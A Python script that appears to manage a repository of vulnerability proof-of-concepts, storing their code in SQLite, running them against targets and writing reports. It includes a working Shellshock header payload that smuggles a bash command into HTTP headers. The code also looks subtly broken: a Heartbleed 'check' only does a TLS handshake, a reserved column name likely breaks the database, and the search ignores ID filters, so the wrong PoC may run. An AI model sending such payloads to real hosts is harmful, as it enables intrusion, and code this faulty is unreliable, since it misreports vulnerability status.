#!/usr/bin/env python3
import os
import json
import yaml
import sqlite3
import subprocess
import datetime
from pathlib import Path
from typing import Dict, List, Optional
import argparse
import hashlib
import shutil
from dataclasses import dataclass, asdict
import docker
import tempfile

@dataclass
class Vulnerability:
    id: str
    cve_id: Optional[str]
    cwe_id: Optional[str]
    name: str
    description: str
    severity: str
    affected_software: List[str]
    poc_code: str
    poc_type: str
    requirements: List[str]
    test_environment: str
    created_date: str
    last_tested: str
    author: str
    references: List[str]
    tags: List[str]
    risk_level: str

class PoCRepository:
    def __init__(self, repo_path: str = "vulnerability_pocs"):
        self.repo_path = Path(repo_path)
        self.db_path = self.repo_path / "poc_database.db"
        self.setup_repository()
        
    def setup_repository(self):
        """Initialize the repository structure"""
        directories = [
            "pocs",
            "docs", 
            "environments",
            "scripts",
            "results",
            "templates"
        ]
        
        for directory in directories:
            (self.repo_path / directory).mkdir(parents=True, exist_ok=True)
        
        # Initialize database
        self.init_database()
        
        # Create template files
        self.create_templates()
        
    def init_database(self):
        """Initialize SQLite database for vulnerability tracking"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id TEXT PRIMARY KEY,
                cve_id TEXT,
                cwe_id TEXT,
                name TEXT NOT NULL,
                description TEXT,
                severity TEXT,
                affected_software TEXT,
                poc_code TEXT,
                poc_type TEXT,
                requirements TEXT,
                test_environment TEXT,
                created_date TEXT,
                last_tested TEXT,
                author TEXT,
                references TEXT,
                tags TEXT,
                risk_level TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS test_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                vulnerability_id TEXT,
                test_date TEXT,
                success BOOLEAN,
                output TEXT,
                environment TEXT,
                FOREIGN KEY (vulnerability_id) REFERENCES vulnerabilities (id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
    def create_templates(self):
        """Create template files for new PoCs"""
        templates = {
            "python_poc_template.py": '''
#!/usr/bin/env python3
"""
Vulnerability: {name}
CVE: {cve_id}
CWE: {cwe_id}
Severity: {severity}

Description:
{description}

Usage:
python3 {filename} --target <target> [options]

WARNING: For educational and authorized testing only.
"""

import argparse
import sys

def exploit(target, port=80):
    """Main exploit function"""
    print(f"[*] Testing {target}:{port} for {__name__}")
    
    try:
        # TODO: Implement exploit logic
        print("[+] Vulnerability check completed")
        return True
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='{name} - Proof of Concept')
    parser.add_argument('--target', required=True, help='Target host')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if exploit(args.target, args.port):
        print("[+] Exploit successful")
        sys.exit(0)
    else:
        print("[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
''',
            "metadata_template.yaml": '''
vulnerability:
  id: "{id}"
  cve: "{cve_id}"
  cwe: "{cwe_id}"
  name: "{name}"
  description: "{description}"
  severity: "{severity}"
  risk_level: "{risk_level}"

technical:
  affected_software: {affected_software}
  poc_type: "{poc_type}"
  requirements: {requirements}

environment:
  test_environment: "{test_environment}"
  setup_commands: []
  cleanup_commands: []

references:
  - {references}

tags: {tags}
'''
        }
        
        template_dir = self.repo_path / "templates"
        for filename, content in templates.items():
            with open(template_dir / filename, 'w') as f:
                f.write(content)
    
    def add_vulnerability(self, vulnerability: Vulnerability):
        """Add a new vulnerability to the repository"""
        # Save PoC code to file
        poc_filename = f"{vulnerability.id}.py"
        poc_path = self.repo_path / "pocs" / poc_filename
        
        with open(poc_path, 'w') as f:
            f.write(vulnerability.poc_code)
        
        # Save metadata
        metadata = asdict(vulnerability)
        metadata_path = self.repo_path / "pocs" / f"{vulnerability.id}.json"
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        # Add to database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO vulnerabilities 
            (id, cve_id, cwe_id, name, description, severity, affected_software, 
             poc_code, poc_type, requirements, test_environment, created_date, 
             last_tested, author, references, tags, risk_level)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            vulnerability.id,
            vulnerability.cve_id,
            vulnerability.cwe_id,
            vulnerability.name,
            vulnerability.description,
            vulnerability.severity,
            json.dumps(vulnerability.affected_software),
            vulnerability.poc_code,
            vulnerability.poc_type,
            json.dumps(vulnerability.requirements),
            vulnerability.test_environment,
            vulnerability.created_date,
            vulnerability.last_tested,
            vulnerability.author,
            json.dumps(vulnerability.references),
            json.dumps(vulnerability.tags),
            vulnerability.risk_level
        ))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Added vulnerability: {vulnerability.name} ({vulnerability.id})")
    
    def search_vulnerabilities(self, **filters):
        """Search vulnerabilities based on filters"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        query = "SELECT * FROM vulnerabilities WHERE 1=1"
        params = []
        
        if 'cve_id' in filters:
            query += " AND cve_id LIKE ?"
            params.append(f"%{filters['cve_id']}%")
        
        if 'severity' in filters:
            query += " AND severity = ?"
            params.append(filters['severity'])
        
        if 'poc_type' in filters:
            query += " AND poc_type = ?"
            params.append(filters['poc_type'])
        
        if 'tags' in filters:
            query += " AND tags LIKE ?"
            params.append(f"%{filters['tags']}%")
        
        cursor.execute(query, params)
        results = cursor.fetchall()
        
        vulnerabilities = []
        for row in results:
            vuln = Vulnerability(
                id=row[0],
                cve_id=row[1],
                cwe_id=row[2],
                name=row[3],
                description=row[4],
                severity=row[5],
                affected_software=json.loads(row[6]),
                poc_code=row[7],
                poc_type=row[8],
                requirements=json.loads(row[9]),
                test_environment=row[10],
                created_date=row[11],
                last_tested=row[12],
                author=row[13],
                references=json.loads(row[14]),
                tags=json.loads(row[15]),
                risk_level=row[16]
            )
            vulnerabilities.append(vuln)
        
        conn.close()
        return vulnerabilities
    
    def run_poc(self, vulnerability_id: str, target: str, **kwargs):
        """Execute a proof of concept"""
        print(f"[*] Running PoC: {vulnerability_id} against {target}")
        
        # Find the vulnerability
        vulns = self.search_vulnerabilities(id=vulnerability_id)
        if not vulns:
            print(f"[-] Vulnerability {vulnerability_id} not found")
            return False
        
        vulnerability = vulns[0]
        
        # Create temporary PoC file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(vulnerability.poc_code)
            temp_poc_path = f.name
        
        try:
            # Execute the PoC
            cmd = ['python3', temp_poc_path, '--target', target]
            for key, value in kwargs.items():
                cmd.extend([f'--{key}', str(value)])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            # Record test result
            self.record_test_result(
                vulnerability_id,
                result.returncode == 0,
                result.stdout + result.stderr,
                "local"
            )
            
            print(f"[+] PoC execution completed")
            print(f"Return code: {result.returncode}")
            print(f"Output: {result.stdout}")
            if result.stderr:
                print(f"Errors: {result.stderr}")
            
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            print(f"[-] PoC execution timed out")
            return False
        except Exception as e:
            print(f"[-] PoC execution failed: {e}")
            return False
        finally:
            # Cleanup
            os.unlink(temp_poc_path)
    
    def record_test_result(self, vulnerability_id: str, success: bool, output: str, environment: str):
        """Record test results in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO test_results 
            (vulnerability_id, test_date, success, output, environment)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            vulnerability_id,
            datetime.datetime.now().isoformat(),
            success,
            output,
            environment
        ))
        
        # Update last_tested date
        cursor.execute('''
            UPDATE vulnerabilities 
            SET last_tested = ? 
            WHERE id = ?
        ''', (datetime.datetime.now().isoformat(), vulnerability_id))
        
        conn.commit()
        conn.close()
    
    def generate_report(self, output_format: str = "markdown"):
        """Generate vulnerability report"""
        vulnerabilities = self.search_vulnerabilities()
        
        if output_format == "markdown":
            return self._generate_markdown_report(vulnerabilities)
        elif output_format == "json":
            return self._generate_json_report(vulnerabilities)
        else:
            return self._generate_text_report(vulnerabilities)
    
    def _generate_markdown_report(self, vulnerabilities: List[Vulnerability]):
        """Generate Markdown format report"""
        report = "# Vulnerability PoC Repository Report\n\n"
        report += f"Generated: {datetime.datetime.now().isoformat()}\n"
        report += f"Total Vulnerabilities: {len(vulnerabilities)}\n\n"
        
        for vuln in vulnerabilities:
            report += f"## {vuln.name} (`{vuln.id}`)\n\n"
            report += f"**CVE:** {vuln.cve_id or 'N/A'} | **CWE:** {vuln.cwe_id or 'N/A'}\n\n"
            report += f"**Severity:** {vuln.severity} | **Risk Level:** {vuln.risk_level}\n\n"
            report += f"**Description:** {vuln.description}\n\n"
            report += f"**Affected Software:** {', '.join(vuln.affected_software)}\n\n"
            report += f"**PoC Type:** {vuln.poc_type}\n\n"
            report += f"**Last Tested:** {vuln.last_tested}\n\n"
            report += "---\n\n"
        
        return report

class SampleVulnerabilities:
    """Sample vulnerability data for demonstration"""
    
    @staticmethod
    def get_sample_vulnerabilities():
        return [
            Vulnerability(
                id="heartbleed-001",
                cve_id="CVE-2014-0160",
                cwe_id="CWE-200",
                name="OpenSSL Heartbleed",
                description="Information disclosure in OpenSSL TLS heartbeat extension",
                severity="HIGH",
                affected_software=["OpenSSL 1.0.1", "OpenSSL 1.0.1a", "OpenSSL 1.0.1f"],
                poc_code='''
#!/usr/bin/env python3
# Heartbleed PoC (Simplified demonstration)
import socket
import ssl

def check_heartbleed(host, port=443):
    """Check if target is vulnerable to Heartbleed"""
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port)) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                print(f"[*] Testing {host}:{port} for Heartbleed")
                # Simplified check - real implementation would send heartbeat
                return "TLS handshake successful"
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 heartbleed.py <host>")
        sys.exit(1)
    
    result = check_heartbleed(sys.argv[1])
    print(result)
''',
                poc_type="information_disclosure",
                requirements=["python3", "openssl"],
                test_environment="docker-ssl-server",
                created_date="2024-01-01",
                last_tested="2024-01-01",
                author="Security Researcher",
                references=["https://heartbleed.com/", "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160"],
                tags=["openssl", "tls", "information-disclosure"],
                risk_level="HIGH"
            ),
            
            Vulnerability(
                id="shellshock-001",
                cve_id="CVE-2014-6271",
                cwe_id="CWE-78",
                name="GNU Bash Shellshock",
                description="Remote code execution through bash environment variables",
                severity="CRITICAL",
                affected_software=["GNU Bash 4.3", "GNU Bash 4.2", "GNU Bash 4.1"],
                poc_code='''
#!/usr/bin/env python3
# Shellshock PoC (Simplified demonstration)
import requests

def check_shellshock(url):
    """Check if web server is vulnerable to Shellshock"""
    headers = {
        'User-Agent': '() { :; }; echo; echo "VULNERABLE"',
        'Cookie': '() { :; }; echo; echo "VULNERABLE"'
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if "VULNERABLE" in response.text:
            return True
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 shellshock.py <url>")
        sys.exit(1)
    
    if check_shellshock(sys.argv[1]):
        print("[+] Target is vulnerable to Shellshock")
    else:
        print("[-] Target appears safe from Shellshock")
''',
                poc_type="remote_code_execution",
                requirements=["python3", "requests"],
                test_environment="docker-bash-server",
                created_date="2024-01-01",
                last_tested="2024-01-01",
                author="Security Researcher",
                references=["https://shellshock.net/"],
                tags=["bash", "rce", "cgi"],
                risk_level="CRITICAL"
            )
        ]

def main():
    parser = argparse.ArgumentParser(description="Vulnerability PoC Repository Manager")
    parser.add_argument("--init", action="store_true", help="Initialize repository")
    parser.add_argument("--add-sample", action="store_true", help="Add sample vulnerabilities")
    parser.add_argument("--search", help="Search vulnerabilities")
    parser.add_argument("--run", help="Run specific PoC by ID")
    parser.add_argument("--target", help="Target for PoC execution")
    parser.add_argument("--report", choices=["markdown", "json", "text"], help="Generate report")
    
    args = parser.parse_args()
    
    repo = PoCRepository()
    
    if args.init:
        print("[+] Repository initialized")
    
    if args.add_sample:
        samples = SampleVulnerabilities.get_sample_vulnerabilities()
        for sample in samples:
            repo.add_vulnerability(sample)
        print(f"[+] Added {len(samples)} sample vulnerabilities")
    
    if args.search:
        results = repo.search_vulnerabilities(name=args.search)
        print(f"[+] Found {len(results)} vulnerabilities:")
        for vuln in results:
            print(f"    {vuln.id}: {vuln.name} ({vuln.severity})")
    
    if args.run and args.target:
        success = repo.run_poc(args.run, args.target)
        if success:
            print("[+] PoC execution successful")
        else:
            print("[-] PoC execution failed")
    
    if args.report:
        report = repo.generate_report(args.report)
        print(report)

if __name__ == "__main__":
    main()
